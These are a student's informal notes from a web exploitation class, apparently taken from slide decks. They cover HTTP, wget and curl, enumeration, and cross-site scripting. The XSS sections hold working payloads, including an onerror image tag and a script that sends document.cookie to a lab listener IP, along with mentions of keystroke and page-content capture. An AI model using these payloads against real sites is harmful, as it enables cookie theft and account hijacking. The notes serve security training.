## web-exploitation.html ##  ## BURP SWEEP??? ##
----------------------------------------------------------
*slide deck notes*

Server/Client Relationship
Synchronous communications between user and services

Not all data is not returned, client only receives what is allowed 

Request/Response:: Various tools to view:: tcpdump  wireshark  Developer Console

HTTP Methods:: A Select Few: GET POST HEAD PUT  https://tools.ietf.org/html/rfc2616

HTTP Fields:: User-Agent  Referer  Cookie  Date  Server  Set-Cookie

http://10.50.x.x/path/pathdemo.php?myfile=demo1 <<< change 1 to another number to interact with the webpage 

Wget 
-------
wget -r -l2 -P /tmp ftp://ftpserver/

wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website

wget --load-cookies cookies.txt -p https://website/interesting/article.php

curl 
----
Supports more protocols vs Wget, such as SCP & POP3

curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png


JavaScript (JS)
---------------------
Coded as .JS files, or in-line of HTML

<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
</script>

<script src="https://www.w3schools.com/js/myScript1.js"></script>


Enumeration
--------------------------
ROBOTS.TXT  Legitimate surfing 

Tools:: NSE scripts  Nikto  Burp suite (outside class)

**/var/www/html ** how many directories start here 


Cross-Site Scripting (XSS) Overview
-------------------------------------
Insertion of arbitrary code into a webpage, that executes in the browser of visitors

Unsanitized GET, POST, and PUT methods allow JS to be placed on websites

Often found in forums that allow HTML

Reflected XSS
-------------------
Below is what you see, but the server will decode as name=abc123
http://example.com/page.php?name=dXNlcjEyMw


Stored XSS
-----------------------
<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">


Useful JavaScript Components
------------------------------
<script>alert('XSS');</script>

## python3 -m http.server ##

this creates a hole for information to go into when i inject the below script 

## <script>document.location="http://10.50.29.68:8000/"+document.cookie;</script> ##

^^^^^ input this into a body function ^^^^

Capturing Cookies

document.cookie

Capturing Keystrokes

bind KEYDOWN and KEYUP

Capturing Sensitive Data

document.body.innerHTML

use this then 

take the cookie and put it here 


Capturing Cookies :: document.cookie

